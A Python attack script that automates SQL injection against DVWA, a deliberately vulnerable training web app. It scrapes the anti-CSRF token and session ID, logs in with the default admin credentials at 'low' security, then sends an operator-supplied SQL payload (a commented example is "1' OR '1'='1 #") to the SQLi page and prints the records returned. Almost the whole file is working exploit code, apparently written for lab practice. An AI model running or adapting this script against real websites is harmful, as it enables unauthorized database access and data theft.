#!/usr/bin/env python3

import requests
import re
import sys
from bs4 import BeautifulSoup
import urllib3
import urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) < 3 :
    print ("[-] usage python dvwa-SQLi1.py targetIP payload")
    exit()


security_level = "low"
payload = sys.argv[2]
target = sys.argv[1]
url = 'http://' + target + '/DVWA/login.php'


def csrf_token():
    try:
        #make request to the URL
        print ("\n[i] URL: %s/DVWA/login.php" %target)
        r = requests.get(url, allow_redirects= False)
    except:
        #feedback for the user
        print ("\n[!] csrf_token: Failed to connect URL. \n[i] Quiting")
        sys.exit(-1)

    #Extract anti-csrf token
    source = BeautifulSoup(r.text, "html.parser")
    user_token = source("input", {"name": "user_token"})[0]["value"]
    print (user_token)
    print ("[i] user_token: %s" % user_token)

    #Extract session information
    session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
    session_id = session_id.group(1)
    print ("[i] session_id: %s" % session_id)

    return session_id, user_token

#Login to DVWA
def dvwa_login(session_id, user_token):
    #POST DATA
    data = { "username": "admin", "password": "password", "user_token": user_token, "Login": "Login"}
    cookie = {"PHPSESSID": session_id, "security": security_level}
    headers = { 'content-type': 'application/x-www-form-urlencoded', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
    try:
        print ("[i] URL: %s/DVWA.login.php" % target)
        print ("[i] Data: %s" % data)
        print ("[i] Cookie: %s" % cookie)
        r = requests.post( url, data=data, cookies=cookie, headers=headers, verify=False, allow_redirects=False)
    except:
        print ("login failed, quiting")
        sys.exit(-1)

    if r.headers["Location"] != 'index.php':
        print ("[-] Login Failed")
        exit()
    
    print ("[+] Logged in Successfully")
    return True

# Send to SQLi payload
def SQLi(session_id):
    SQli_url = 'http://' + target + '/DVWA/vulnerabilities/sqli/'
    #GET Data
    #My first payload to retrive data is sqli_payload. But this version your payload what you want enter through 2nd parameter.
    #sqli_payload = "1' OR '1'='1 #"
    data = { "id": payload, "Submit": "Submit" }
    encoded_data = urllib.parse.urlencode(data)
    cookie = {"PHPSESSID": session_id, "security": security_level}
    headers = { 'content-type': 'application/x-www-form-urlencoded', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
    
    print ("Sending Evil SQL Payload 1' OR '1'='1 #")
    r = requests.get(SQli_url, params=encoded_data, cookies=cookie, headers=headers, verify=False)
    soup = BeautifulSoup(r.text, "html.parser")
    soup.prettify()
    soup1 =soup.find_all("div", {"class":"vulnerable_code_area"})
    for ID in soup1[0].find_all("pre"):
        print(ID)



# Get initial CSRF token
session_id, user_token = csrf_token()

# Login to DVWA
dvwa_login(session_id, user_token)

#Send Evil SQLi payload
SQLi(session_id)


